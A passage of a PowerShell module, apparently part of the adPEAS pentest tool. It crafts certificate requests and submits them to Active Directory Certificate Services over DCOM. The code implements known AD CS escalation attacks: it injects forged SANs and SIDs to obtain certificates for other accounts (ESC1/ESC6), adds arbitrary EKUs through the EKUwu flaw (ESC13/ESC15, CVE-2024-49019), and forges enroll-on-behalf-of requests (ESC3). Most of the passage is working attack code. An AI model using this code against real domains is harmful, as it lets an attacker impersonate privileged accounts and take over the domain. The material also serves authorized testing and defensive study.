#region ===== PKCS#10 CSR GENERATION =====

<#
.SYNOPSIS
    Generates a PKCS#10 Certificate Signing Request using ASN.1 DER encoding.
#>
function New-PKCS10Request {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SubjectDN,

        [string[]]$AlternativeNames,

        [string]$SID,

        [string[]]$ApplicationPolicies,

        [ValidateSet(1024, 2048, 4096)]
        [int]$KeyLength = 2048
    )

    $FunctionPrefix = "[New-PKCS10Request]"

    # Generate RSA key pair
    Write-Log "$FunctionPrefix Generating $KeyLength-bit RSA key pair (Subject='$SubjectDN', SANs=$($AlternativeNames.Count), SID=$(if ($SID) { 'yes' } else { 'no' }), AppPolicies=$($ApplicationPolicies.Count))"
    $rsa = [System.Security.Cryptography.RSA]::Create($KeyLength)

    try {
        # === 1. Build Subject DN as ASN.1 RDNSequence ===
        $subjectBytes = ConvertTo-ASN1Subject -SubjectDN $SubjectDN

        # === 2. Build SubjectPublicKeyInfo ===
        $rsaParams = $rsa.ExportParameters($false)

        # RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
        $modulusInt = New-ASN1Integer -Value ([byte[]](@(0x00) + $rsaParams.Modulus))
        $exponentInt = New-ASN1Integer -Value $rsaParams.Exponent
        $rsaPublicKey = New-ASN1Sequence -Data ([byte[]]($modulusInt + $exponentInt))

        # AlgorithmIdentifier for rsaEncryption (1.2.840.113549.1.1.1)
        $rsaOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.1.1"
        $algNull = New-ASN1Null
        $algorithmId = New-ASN1Sequence -Data ([byte[]]($rsaOID + $algNull))

        # SubjectPublicKeyInfo ::= SEQUENCE { algorithm, subjectPublicKey BIT STRING }
        $pubKeyBitString = New-ASN1BitString -Value $rsaPublicKey
        $subjectPKInfo = New-ASN1Sequence -Data ([byte[]]($algorithmId + $pubKeyBitString))

        # === 3. Build Attributes [0] ===
        # Collect all requested X.509 extensions, then wrap them in a single
        # extensionRequest attribute (RFC 2985). Supported extensions:
        #   - Subject Alternative Name (2.5.29.17)            via -AlternativeNames
        #   - NTDS CA Security Extension (1.3.6.1.4.1.311.25.2) via -SID
        $attributesContent = [byte[]]@()
        $extensionBlobs = [System.Collections.Generic.List[byte]]::new()
        $extensionCount = 0

        # Assemble the SAN GeneralNames. The SID is embedded BOTH as a SAN URL
        # (tag:microsoft.com,2022-09-14:sid:<SID>) and as the dedicated NTDS CA
        # Security Extension below - this mirrors Certipy. CAs that honour requester
        # SANs (ESC1/ESC6) copy the SAN URL into the issued certificate even when they
        # ignore the requester-supplied NTDS extension, so the SAN URL is the reliable
        # carrier for strong mapping.
        $sanNames = @()
        if ($AlternativeNames -and $AlternativeNames.Count -gt 0) {
            $sanNames += $AlternativeNames
        }
        if ($SID) {
            $sanNames += "URL:tag:microsoft.com,2022-09-14:sid:$SID"
        }

        if ($sanNames.Count -gt 0) {
            $sanExtension = New-SANExtension -AlternativeNames $sanNames
            if ($sanExtension) {
                $extensionBlobs.AddRange([byte[]]$sanExtension)
                $extensionCount++
                Write-Log "$FunctionPrefix Added Subject Alternative Name extension ($($sanNames.Count) name(s)): $($sanNames -join ', ')"
            }
            else {
                Write-Log "$FunctionPrefix SAN extension requested but produced no GeneralNames - skipping"
            }
        }

        if ($SID) {
            # Dedicated NTDS CA Security Extension for strong mapping on DCs running
            # StrongCertificateBindingEnforcement (KB5014754, mandatory since Feb 2025).
            $sidExtension = New-NTDSCASecurityExtension -SID $SID
            if ($sidExtension) {
                $extensionBlobs.AddRange([byte[]]$sidExtension)
                $extensionCount++
                Write-Log "$FunctionPrefix Added NTDS CA Security (SID) extension: $SID"
            }
            else {
                Write-Log "$FunctionPrefix SID extension requested but could not be built for '$SID' - skipping" -Level Warning
            }
        }

        if ($ApplicationPolicies -and $ApplicationPolicies.Count -gt 0) {
            # ESC13/ESC15: inject Microsoft Application Policies (szOID_APPLICATION_CERT_POLICIES).
            # On schema-v1 templates (CVE-2024-49019/EKUwu) these are not sanitised, so
            # arbitrary EKUs (e.g. Client Authentication, Certificate Request Agent) can
            # be requested even when the template does not list them.
            $apExtension = New-ApplicationPoliciesExtension -PolicyOIDs $ApplicationPolicies
            if ($apExtension) {
                $extensionBlobs.AddRange([byte[]]$apExtension)
                $extensionCount++
                Write-Log "$FunctionPrefix Added Application Policies extension ($($ApplicationPolicies.Count) requested)"
            }
            else {
                Write-Log "$FunctionPrefix Application Policies requested but none could be resolved - skipping" -Level Warning
            }
        }

        if ($extensionCount -gt 0) {
            # Extensions ::= SEQUENCE OF Extension
            $extensionsSeq = New-ASN1Sequence -Data ($extensionBlobs.ToArray())

            # extensionRequest attribute: OID 1.2.840.113549.1.9.14 + SET { Extensions }
            $extReqOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.9.14"
            $extReqValues = New-ASN1Set -Data $extensionsSeq
            $extReqAttr = New-ASN1Sequence -Data ([byte[]]($extReqOID + $extReqValues))
            $attributesContent = $extReqAttr
            Write-Log "$FunctionPrefix Built extensionRequest attribute with $extensionCount extension(s)"
        }
        else {
            Write-Log "$FunctionPrefix No extensions requested - CSR has empty attribute set"
        }

        # [0] IMPLICIT constructed context tag
        $attributesTag = [byte]0xA0
        $attributesLenBytes = New-ASN1Length -Length $attributesContent.Length
        $attributes = [byte[]](@($attributesTag) + $attributesLenBytes + $attributesContent)

        # === 4. Build CertificationRequestInfo ===
        $versionInt = New-ASN1Integer -Value 0
        $certReqInfo = New-ASN1Sequence -Data ([byte[]]($versionInt + $subjectBytes + $subjectPKInfo + $attributes))

        # === 5. Sign CertificationRequestInfo ===
        # sha256WithRSAEncryption (1.2.840.113549.1.1.11)
        $sigAlgOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.1.11"
        $sigAlgNull = New-ASN1Null
        $sigAlgorithm = New-ASN1Sequence -Data ([byte[]]($sigAlgOID + $sigAlgNull))

        # Sign with PKCS#1 v1.5
        $signature = $rsa.SignData($certReqInfo, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
        $sigBitString = New-ASN1BitString -Value $signature

        # === 6. Build CertificationRequest ===
        $certRequest = New-ASN1Sequence -Data ([byte[]]($certReqInfo + $sigAlgorithm + $sigBitString))

        # Convert to Base64 (PEM-style, single line for certsrv)
        $csrBase64 = [Convert]::ToBase64String($certRequest)

        Write-Log "$FunctionPrefix CSR generated: $($certRequest.Length) bytes, Subject: $SubjectDN"

        return @{
            CSRBytes  = $certRequest
            CSRBase64 = $csrBase64
            RSAKey    = $rsa
        }
    }
    catch {
        if ($rsa) { $rsa.Dispose() }
        throw
    }
}

<#
.SYNOPSIS
    Converts a Subject DN string to ASN.1 DER encoded RDNSequence.
#>
function ConvertTo-ASN1Subject {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SubjectDN
    )

    # Well-known attribute type OIDs
    $attrOIDs = @{
        'CN'  = '2.5.4.3'
        'O'   = '2.5.4.10'
        'OU'  = '2.5.4.11'
        'C'   = '2.5.4.6'
        'ST'  = '2.5.4.8'
        'L'   = '2.5.4.7'
        'DC'  = '0.9.2342.19200300.100.1.25'
        'E'   = '1.2.840.113549.1.9.1'
    }

    # Parse DN components (simple parser for CN=...,O=...,DC=... format)
    $rdnSets = [System.Collections.Generic.List[byte[]]]::new()

    # Split on comma but not within escaped commas
    $parts = [regex]::Split($SubjectDN, ',(?=\s*(?:CN|O|OU|C|ST|L|DC|E)\s*=)', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)

    foreach ($part in $parts) {
        $part = $part.Trim()
        if (-not $part) { continue }

        $eqIdx = $part.IndexOf('=')
        if ($eqIdx -lt 0) { continue }

        $attrType = $part.Substring(0, $eqIdx).Trim().ToUpper()
        $attrValue = $part.Substring($eqIdx + 1).Trim()

        if (-not $attrOIDs.ContainsKey($attrType)) {
            Write-Log "[ConvertTo-ASN1Subject] Unknown attribute type: $attrType, skipping"
            continue
        }

        $oid = New-ASN1ObjectIdentifier -OID $attrOIDs[$attrType]

        # Use PrintableString for most, IA5String for DC and E
        if ($attrType -eq 'DC' -or $attrType -eq 'E') {
            $value = New-ASN1IA5String -Value $attrValue
        }
        elseif ($attrType -eq 'C') {
            # Country must be PrintableString
            $value = New-ASN1PrintableString -Value $attrValue
        }
        else {
            $value = New-ASN1UTF8String -Value $attrValue
        }

        # AttributeTypeAndValue ::= SEQUENCE { type OID, value ANY }
        $atv = New-ASN1Sequence -Data ([byte[]]($oid + $value))

        # RelativeDistinguishedName ::= SET OF AttributeTypeAndValue
        $rdn = New-ASN1Set -Data $atv

        $rdnSets.Add($rdn)
    }

    if ($rdnSets.Count -eq 0) {
        throw "Failed to parse Subject DN: $SubjectDN"
    }

    # Name ::= SEQUENCE OF RelativeDistinguishedName
    $allRDNs = [byte[]]@()
    foreach ($rdn in $rdnSets) {
        $allRDNs = [byte[]]($allRDNs + $rdn)
    }

    return New-ASN1Sequence -Data $allRDNs
}

<#
.SYNOPSIS
    Builds a Subject Alternative Name extension for PKCS#10 CSR attributes.
#>
function New-SANExtension {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string[]]$AlternativeNames
    )

    $generalNames = [byte[]]@()

    foreach ($san in $AlternativeNames) {
        $colonIdx = $san.IndexOf(':')
        if ($colonIdx -lt 0) {
            Write-Warning "[New-SANExtension] Invalid SAN format '$san', expected 'TYPE:value'. Skipping."
            continue
        }

        $sanType = $san.Substring(0, $colonIdx).Trim().ToUpper()
        $sanValue = $san.Substring($colonIdx + 1).Trim()

        switch ($sanType) {
            'UPN' {
                # otherName [0] { OID(1.3.6.1.4.1.311.20.2.3), [0] UTF8String }
                $upnOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.20.2.3"
                $upnUTF8 = New-ASN1UTF8String -Value $sanValue

                # Explicit context tag [0] around UTF8String
                $ctx0Inner = [byte[]](@(0xA0) + (New-ASN1Length -Length $upnUTF8.Length) + $upnUTF8)

                # otherName content = OID + [0] value
                $otherNameContent = [byte[]]($upnOID + $ctx0Inner)

                # GeneralName [0] IMPLICIT (otherName)
                $otherNameTag = [byte]0xA0
                $otherNameLen = New-ASN1Length -Length $otherNameContent.Length
                $generalNames += [byte[]](@($otherNameTag) + $otherNameLen + $otherNameContent)
            }
            'DNS' {
                # dNSName [2] IA5String
                $dnsBytes = [System.Text.Encoding]::ASCII.GetBytes($sanValue)
                $dnsTag = [byte]0x82  # Context [2] IMPLICIT
                $dnsLen = New-ASN1Length -Length $dnsBytes.Length
                $generalNames += [byte[]](@($dnsTag) + $dnsLen + $dnsBytes)
            }
            'URL' {
                # uniformResourceIdentifier [6] IA5String
                # Used for the SID-in-SAN form: tag:microsoft.com,2022-09-14:sid:<SID>
                $urlBytes = [System.Text.Encoding]::ASCII.GetBytes($sanValue)
                $urlTag = [byte]0x86  # Context [6] IMPLICIT
                $urlLen = New-ASN1Length -Length $urlBytes.Length
                $generalNames += [byte[]](@($urlTag) + $urlLen + $urlBytes)
            }
            default {
                Write-Warning "[New-SANExtension] Unsupported SAN type '$sanType'. Supported: UPN, DNS, URL."
            }
        }
    }

    if ($generalNames.Length -eq 0) {
        return $null
    }

    # GeneralNames ::= SEQUENCE OF GeneralName
    $generalNamesSeq = New-ASN1Sequence -Data $generalNames

    # Extension ::= SEQUENCE { extnID OID, critical BOOLEAN (optional), extnValue OCTET STRING }
    $sanOID = New-ASN1ObjectIdentifier -OID "2.5.29.17"
    $sanOctet = New-ASN1OctetString -Value $generalNamesSeq

    return [byte[]](New-ASN1Sequence -Data ([byte[]]($sanOID + $sanOctet)))
}

<#
.SYNOPSIS
    Builds the NTDS CA Security Extension (szOID_NTDS_CA_SECURITY_EXT) carrying an
    object SID for strong certificate mapping.
.DESCRIPTION
    Encodes the requested principal's SID into the certificate so that domain
    controllers enforcing StrongCertificateBindingEnforcement (KB5014754) map the
    certificate to that principal. The structure mirrors what the CA itself emits:

        Extension ::= SEQUENCE {
            extnID    OBJECT IDENTIFIER (1.3.6.1.4.1.311.25.2),
            extnValue OCTET STRING wrapping
                SEQUENCE OF GeneralName {
                    [0] otherName {
                        type-id OBJECT IDENTIFIER (1.3.6.1.4.1.311.25.2.1),
                        value   [0] EXPLICIT OCTET STRING (SID string, ASCII)
                    }
                }
        }

    The SID is carried in its string form (e.g. "S-1-5-21-...-500") as required by
    szOID_NTDS_OBJECTSID.
#>
function New-NTDSCASecurityExtension {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SID
    )

    $FunctionPrefix = "[New-NTDSCASecurityExtension]"

    if ($SID -notmatch '^S-1-\d+(-\d+)+$') {
        Write-Warning "$FunctionPrefix '$SID' is not a valid SID string (expected S-1-5-21-...). Skipping SID extension."
        return $null
    }

    # otherName value: [0] EXPLICIT OCTET STRING (SID string as ASCII)
    $sidBytes = [System.Text.Encoding]::ASCII.GetBytes($SID)
    $sidOctet = New-ASN1OctetString -Value $sidBytes
    $ctx0Value = [byte[]](@(0xA0) + (New-ASN1Length -Length $sidOctet.Length) + $sidOctet)

    # otherName content: type-id OID (szOID_NTDS_OBJECTSID) + [0] value
    $objectSidOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.25.2.1"
    $otherNameContent = [byte[]]($objectSidOID + $ctx0Value)

    # GeneralName [0] IMPLICIT (otherName)
    $otherName = [byte[]](@(0xA0) + (New-ASN1Length -Length $otherNameContent.Length) + $otherNameContent)

    # GeneralNames ::= SEQUENCE OF GeneralName
    $generalNamesSeq = New-ASN1Sequence -Data $otherName

    # Extension ::= SEQUENCE { extnID, extnValue OCTET STRING }
    $extOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.25.2"
    $extnValue = New-ASN1OctetString -Value $generalNamesSeq

    Write-Log "$FunctionPrefix Encoded NTDS CA Security Extension for SID $SID"
    return [byte[]](New-ASN1Sequence -Data ([byte[]]($extOID + $extnValue)))
}

<#
.SYNOPSIS
    Builds the Microsoft Application Policies extension (szOID_APPLICATION_CERT_POLICIES,
    1.3.6.1.4.1.311.21.10) for ESC13/ESC15 (EKUwu / CVE-2024-49019).
.DESCRIPTION
    Encodes a CertificatePolicies value (SEQUENCE OF PolicyInformation, each just a
    policyIdentifier OID, no qualifiers) - the same shape as RFC 5280 certificatePolicies.
    Accepts raw OIDs or a set of friendly names (Client Authentication, Certificate
    Request Agent, Smart Card Logon, ...). Non-critical, matching Certipy.
.OUTPUTS
    DER bytes of the Extension SEQUENCE, or $null if no policy could be resolved.
#>
function New-ApplicationPoliciesExtension {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string[]]$PolicyOIDs
    )

    $FunctionPrefix = "[New-ApplicationPoliciesExtension]"

    # Friendly name -> OID (lowercased keys). Raw OIDs are passed through unchanged.
    $nameToOid = @{
        'client authentication'         = '1.3.6.1.5.5.7.3.2'
        'server authentication'         = '1.3.6.1.5.5.7.3.1'
        'smart card logon'              = '1.3.6.1.4.1.311.20.2.2'
        'smartcardlogon'                = '1.3.6.1.4.1.311.20.2.2'
        'certificate request agent'     = '1.3.6.1.4.1.311.20.2.1'
        'enrollment agent'              = '1.3.6.1.4.1.311.20.2.1'
        'code signing'                  = '1.3.6.1.5.5.7.3.3'
        'any purpose'                   = '2.5.29.37.0'
        'pkinit client authentication'  = '1.3.6.1.5.2.3.4'
        'secure email'                  = '1.3.6.1.5.5.7.3.4'
        'email protection'              = '1.3.6.1.5.5.7.3.4'
    }

    $policyInfos = [System.Collections.Generic.List[byte]]::new()
    $resolvedCount = 0

    foreach ($p in $PolicyOIDs) {
        $val = $p.Trim()
        $oid = $null
        if ($val -match '^\d+(\.\d+)+$') {
            $oid = $val
        }
        elseif ($nameToOid.ContainsKey($val.ToLower())) {
            $oid = $nameToOid[$val.ToLower()]
        }
        else {
            Write-Warning "$FunctionPrefix Unknown application policy '$p' (not an OID and not a known friendly name). Skipping."
            continue
        }

        # PolicyInformation ::= SEQUENCE { policyIdentifier OID }
        $policyInfo = New-ASN1Sequence -Data (New-ASN1ObjectIdentifier -OID $oid)
        $policyInfos.AddRange([byte[]]$policyInfo)
        $resolvedCount++
        Write-Log "$FunctionPrefix Application policy: '$p' -> $oid"
    }

    if ($resolvedCount -eq 0) {
        return $null
    }

    # CertificatePolicies ::= SEQUENCE OF PolicyInformation
    $certPolicies = New-ASN1Sequence -Data ($policyInfos.ToArray())

    # Extension ::= SEQUENCE { extnID, extnValue OCTET STRING }
    $extOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.21.10"
    $extnValue = New-ASN1OctetString -Value $certPolicies

    return [byte[]](New-ASN1Sequence -Data ([byte[]]($extOID + $extnValue)))
}

<#
.SYNOPSIS
    Encodes a string as an ASN.1 BMPString (UTF-16BE). The caller is responsible for
    any trailing null character (Windows EnrollmentNameValuePair values are null-terminated).
#>
function New-ASN1BMPString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [AllowEmptyString()]
        [string]$Value
    )
    $bytes = [System.Text.Encoding]::BigEndianUnicode.GetBytes($Value)
    return [byte[]](@(0x1E) + (New-ASN1Length -Length $bytes.Length) + $bytes)
}

<#
.SYNOPSIS
    Builds an "enroll on behalf of" (ESC3) request: a PKCS#7 SignedData envelope around
    the target's inner PKCS#10 CSR, signed by an enrollment-agent certificate.
.DESCRIPTION
    Mirrors the structure Certipy/certreq produce for enrollment-agent requests:
      ContentInfo (signed_data)
        SignedData
          encapContentInfo.contentType = data (1.2.840.113549.1.7.1), content = inner CSR DER
          certificates = [ agent certificate ]
          SignerInfo (signed by the agent key) with signed attributes:
            - 1.3.6.1.4.1.311.21.10 (szOID_APPLICATION_CERT_POLICIES) = Client Auth EKU OID
            - 1.3.6.1.4.1.311.13.2.1 (szOID_ENROLLMENT_NAME_VALUE_PAIR)
                = EnrollmentNameValuePair { "requestername", "DOMAIN\user" } (BMPString)
            - message-digest / content-type (added automatically by SignedCms)
    The agent certificate must carry the Certificate Request Agent EKU
    (1.3.6.1.4.1.311.20.2.1) for the CA to honour the request.
.OUTPUTS
    Base64 string of the PKCS#7 DER, or $null on failure.
#>
function New-EnrollOnBehalfOfRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [byte[]]$InnerCsrDer,

        [Parameter(Mandatory)]
        [string]$OnBehalfOf,

        [Parameter(Mandatory)]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$AgentCert
    )

    $FunctionPrefix = "[New-EnrollOnBehalfOfRequest]"

    if (-not $AgentCert.HasPrivateKey) {
        Write-Warning "$FunctionPrefix Agent certificate has no associated private key - cannot sign the request."
        return $null
    }

    try { Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue } catch { }

    # EnrollmentNameValuePair { name BMPString, value BMPString }, null-terminated
    # (UTF-16BE) to match Windows/Certipy on-the-wire encoding.
    $nameBmp = New-ASN1BMPString -Value ("requestername" + [char]0)
    $valBmp  = New-ASN1BMPString -Value ($OnBehalfOf + [char]0)
    $envpDer = New-ASN1Sequence -Data ([byte[]]($nameBmp + $valBmp))

    # Application cert policies attribute value: the Client Authentication EKU OID
    $clientAuthOidDer = New-ASN1ObjectIdentifier -OID "1.3.6.1.5.5.7.3.2"

    try {
        $contentInfo = New-Object System.Security.Cryptography.Pkcs.ContentInfo -ArgumentList (,[byte[]]$InnerCsrDer)
        $cms = New-Object System.Security.Cryptography.Pkcs.SignedCms -ArgumentList $contentInfo, $false
        $signer = New-Object System.Security.Cryptography.Pkcs.CmsSigner -ArgumentList $AgentCert
        $signer.DigestAlgorithm = New-Object System.Security.Cryptography.Oid -ArgumentList "2.16.840.1.101.3.4.2.1"  # SHA256
        $signer.IncludeOption = [System.Security.Cryptography.X509Certificates.X509IncludeOption]::EndCertOnly

        # Note: CryptographicAttributeObjectCollection.Add returns an int index;
        # suppress it with [void] so it does not leak into the function's output.
        $appPolOid = New-Object System.Security.Cryptography.Oid -ArgumentList "1.3.6.1.4.1.311.21.10"
        [void]$signer.SignedAttributes.Add((New-Object System.Security.Cryptography.AsnEncodedData -ArgumentList $appPolOid, ([byte[]]$clientAuthOidDer)))

        $envpOid = New-Object System.Security.Cryptography.Oid -ArgumentList "1.3.6.1.4.1.311.13.2.1"
        [void]$signer.SignedAttributes.Add((New-Object System.Security.Cryptography.AsnEncodedData -ArgumentList $envpOid, ([byte[]]$envpDer)))

        $cms.ComputeSignature($signer)
        $p7 = $cms.Encode()
        Write-Log "$FunctionPrefix Built enroll-on-behalf-of PKCS#7 ($($p7.Length) bytes) for '$OnBehalfOf' signed by '$($AgentCert.Subject)'"
        return [Convert]::ToBase64String($p7)
    }
    catch {
        Write-Warning "$FunctionPrefix Failed to build/sign on-behalf-of request: $_"
        return $null
    }
}

#endregion

#region ===== COM/RPC CERTIFICATE REQUEST (FALLBACK) =====

<#
.SYNOPSIS
    Embedded C# code for ICertRequest COM interface.
.DESCRIPTION
    Provides COM interop for certificate enrollment when Web Enrollment (/certsrv/) is unavailable.
    Uses the Certificate Enrollment COM API (ICertRequest) via DCOM.
#>

$Script:ICertRequestCode = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace adPEAS
{
    // Certificate Request disposition codes
    public enum CR_DISPOSITION
    {
        CR_DISP_INCOMPLETE = 0,
        CR_DISP_ERROR = 1,
        CR_DISP_DENIED = 2,
        CR_DISP_ISSUED = 3,
        CR_DISP_ISSUED_OUT_OF_BAND = 4,
        CR_DISP_UNDER_SUBMISSION = 5,
        CR_DISP_REVOKED = 6
    }

    // Certificate Request flags
    public static class CR_FLAGS
    {
        public const int CR_IN_BASE64 = 0x1;
        public const int CR_IN_PKCS10 = 0x100;
        public const int CR_IN_PKCS7 = 0x300;
        public const int CR_OUT_BASE64 = 0x1;
        public const int CR_OUT_CHAIN = 0x100;
    }

    // ICertRequest COM interface
    [ComImport]
    [Guid("014E4840-5523-11CF-8BDB-00AA00C005A4")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface ICertRequest
    {
        [DispId(0x60020000)]
        int Submit(
            [In] int Flags,
            [In, MarshalAs(UnmanagedType.BStr)] string strRequest,
            [In, MarshalAs(UnmanagedType.BStr)] string strAttributes,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig);

        [DispId(0x60020001)]
        int RetrievePending(
            [In] int RequestId,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig);

        [DispId(0x60020002)]
        int GetLastStatus();

        [DispId(0x60020003)]
        int GetRequestId();

        [DispId(0x60020004)]
        int GetDispositionMessage(
            [Out, MarshalAs(UnmanagedType.BStr)] out string pstrDispositionMessage);

        [DispId(0x60020005)]
        int GetCACertificate(
            [In] int fExchangeCertificate,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig,
            [In] int Flags);

        [DispId(0x60020006)]
        int GetCertificate(
            [In] int Flags,
            [Out, MarshalAs(UnmanagedType.BStr)] out string pstrCertificate);
    }

    // Certificate Request helper class
    public class CertificateRequest
    {
        public static CertRequestResult SubmitRequest(
            string caServer,
            string caName,
            string csrBase64,
            string templateName,
            int inputFlags)
        {
            var result = new CertRequestResult
            {
                Success = false,
                Disposition = -1,
                ErrorMessage = null,
                CertificateBase64 = null,
                RequestID = -1
            };

            ICertRequest certRequest = null;

            try
            {
                // Create the ICertRequest COM object LOCALLY. The request is routed
                // to the (possibly remote) CA by the strConfig "CAHost\CAName" string,
                // which the certificate client resolves to the CA's ICertRequestD(2)
                // DCOM interface. Activating the client object remotely (passing the CA
                // host as the COM server) is wrong and normally fails with access denied.
                // Any alternate credentials are applied by the caller via thread
                // impersonation (LogonUser/ImpersonateLoggedOnUser) before this call.
                Type certRequestType = Type.GetTypeFromProgID("CertificateAuthority.Request");
                if (certRequestType == null)
                {
                    result.ErrorMessage = "Failed to get COM type CertificateAuthority.Request (certificate enrollment COM API not available on this host)";
                    return result;
                }

                object certRequestObj = Activator.CreateInstance(certRequestType);
                certRequest = (ICertRequest)certRequestObj;

                // Build CA config string: "CAServer\CAName"
                string caConfig = string.Format("{0}\\{1}", caServer, caName);

                // Build certificate attributes
                string attributes = string.Format("CertificateTemplate:{0}", templateName);

                // Submit request. inputFlags lets the caller choose the request
                // format (PKCS#10 for a normal CSR, PKCS#7 for an enroll-on-behalf-of
                // SignedData envelope). Fall back to Base64 PKCS#10 when unset.
                int flags = inputFlags != 0 ? inputFlags : (CR_FLAGS.CR_IN_BASE64 | CR_FLAGS.CR_IN_PKCS10);
                int disposition = certRequest.Submit(flags, csrBase64, attributes, caConfig);

                result.Disposition = disposition;
                result.RequestID = certRequest.GetRequestId();

                // Get disposition message
                string dispositionMessage;
                certRequest.GetDispositionMessage(out dispositionMessage);

                if (disposition == (int)CR_DISPOSITION.CR_DISP_ISSUED)
                {
                    // Certificate was issued - retrieve the leaf certificate as Base64.
                    // CR_OUT_CHAIN is intentionally NOT set: we only need the issued
                    // certificate to pair with our private key, and a single cert is
                    // simpler to decode than a Base64 PKCS#7 chain.
                    string certificate;
                    int outFlags = CR_FLAGS.CR_OUT_BASE64;
                    certRequest.GetCertificate(outFlags, out certificate);

                    result.Success = true;
                    result.CertificateBase64 = certificate;
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_UNDER_SUBMISSION)
                {
                    result.ErrorMessage = string.Format("Certificate request pending (RequestID: {0}): {1}",
                        result.RequestID, dispositionMessage);
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_DENIED)
                {
                    result.ErrorMessage = string.Format("Certificate request denied: {0}", dispositionMessage);
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_ERROR)
                {
                    int lastStatus = certRequest.GetLastStatus();
                    result.ErrorMessage = string.Format("Certificate request error (0x{0:X}): {1}",
                        lastStatus, dispositionMessage);
                }
                else
                {
                    result.ErrorMessage = string.Format("Unknown disposition {0}: {1}",
                        disposition, dispositionMessage);
                }
            }
            catch (Exception ex)
            {
                result.ErrorMessage = string.Format("COM exception: {0}", ex.Message);
            }
            finally
            {
                // Release COM object
                if (certRequest != null)
                {
                    Marshal.ReleaseComObject(certRequest);
                }
            }

            return result;
        }
    }

    // Result class
    public class CertRequestResult
    {
        public bool Success;
        public int Disposition;
        public int RequestID;
        public string CertificateBase64;
        public string ErrorMessage;
    }
}
'@

# Load COM interop type (only once)
if (-not ([System.Management.Automation.PSTypeName]'adPEAS.CertificateRequest').Type) {
    try {
        Add-Type -TypeDefinition $Script:ICertRequestCode -Language CSharp -IgnoreWarnings -ErrorAction Stop
        Write-Log "[Request-ADCSCertificate] ICertRequest COM type loaded successfully"
    }
    catch {
        Write-Log "[Request-ADCSCertificate] Failed to load ICertRequest COM type: $_" -Level Warning
    }
}

<#
.SYNOPSIS
    Decodes a Base64 blob into an X509Certificate2, transparently handling both a
    single DER certificate and a PKCS#7 / degenerate certs-only chain.
.DESCRIPTION
    The certsrv web endpoint returns a single PEM/DER certificate, while the
    ICertRequest COM interface and some CAs return a Base64 PKCS#7 chain. This
    helper normalises both into the leaf (end-entity) X509Certificate2 so the
    private key can be attached uniformly downstream.
#>
function ConvertTo-X509FromBase64 {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Base64
    )

    $FunctionPrefix = "[ConvertTo-X509FromBase64]"

    # Strip PEM headers/whitespace if present
    $clean = $Base64
    if ($clean -match '(?s)-----BEGIN[^-]+-----\s*(.+?)\s*-----END[^-]+-----') {
        $clean = $Matches[1]
    }
    $clean = $clean -replace '\s', ''

    if ([string]::IsNullOrEmpty($clean)) {
        Write-Log "$FunctionPrefix Empty Base64 input" -Level Warning
        return $null
    }

    try {
        $bytes = [Convert]::FromBase64String($clean)
    }
    catch {
        Write-Log "$FunctionPrefix Input is not valid Base64: $_" -Level Warning
        return $null
    }

    # First attempt: single X.509 certificate
    try {
        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$bytes)
        Write-Log "$FunctionPrefix Decoded single X.509 certificate (Subject=$($cert.Subject))"
        return $cert
    }
    catch {
        Write-Log "$FunctionPrefix Not a single DER certificate, trying PKCS#7 chain: $_"
    }

    # Second attempt: PKCS#7 / degenerate SignedCms chain - extract the leaf
    try {
        $cms = New-Object System.Security.Cryptography.Pkcs.SignedCms
        $cms.Decode($bytes)
        $coll = $cms.Certificates
        if (-not $coll -or $coll.Count -eq 0) {
            Write-Log "$FunctionPrefix PKCS#7 contained no certificates" -Level Warning
            return $null
        }

        # The leaf is the certificate that is not the issuer of any other cert
        $leaf = $null
        foreach ($candidate in $coll) {
            $isIssuerOfAnother = $false
            foreach ($other in $coll) {
                if ($other.Subject -ne $candidate.Subject -and $other.Issuer -eq $candidate.Subject) {
                    $isIssuerOfAnother = $true
                    break
                }
            }
            if (-not $isIssuerOfAnother) { $leaf = $candidate; break }
        }
        if (-not $leaf) { $leaf = $coll[0] }

        Write-Log "$FunctionPrefix Extracted leaf certificate from PKCS#7 chain of $($coll.Count) (Subject=$($leaf.Subject))"
        return $leaf
    }
    catch {
        Write-Log "$FunctionPrefix Failed to decode as PKCS#7: $_" -Level Warning
        return $null
    }
}

<#
.SYNOPSIS
    Submits a PKCS#10 CSR via ICertRequest COM/RPC interface.
.DESCRIPTION
    Used when Web Enrollment (/certsrv/) is unavailable or when -Method COM is
    forced. Instantiates the ICertRequest client locally and routes the request to
    the CA via the "CAHost\CAName" config string (the CA's ICertRequestD2 DCOM
    interface). When -Credential is supplied, the call runs under a netonly
    impersonation token so alternate credentials reach the CA.
#>
function Submit-COMRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$CAName,

        [Parameter(Mandatory)]
        [string]$CSRBase64,

        [Parameter(Mandatory)]
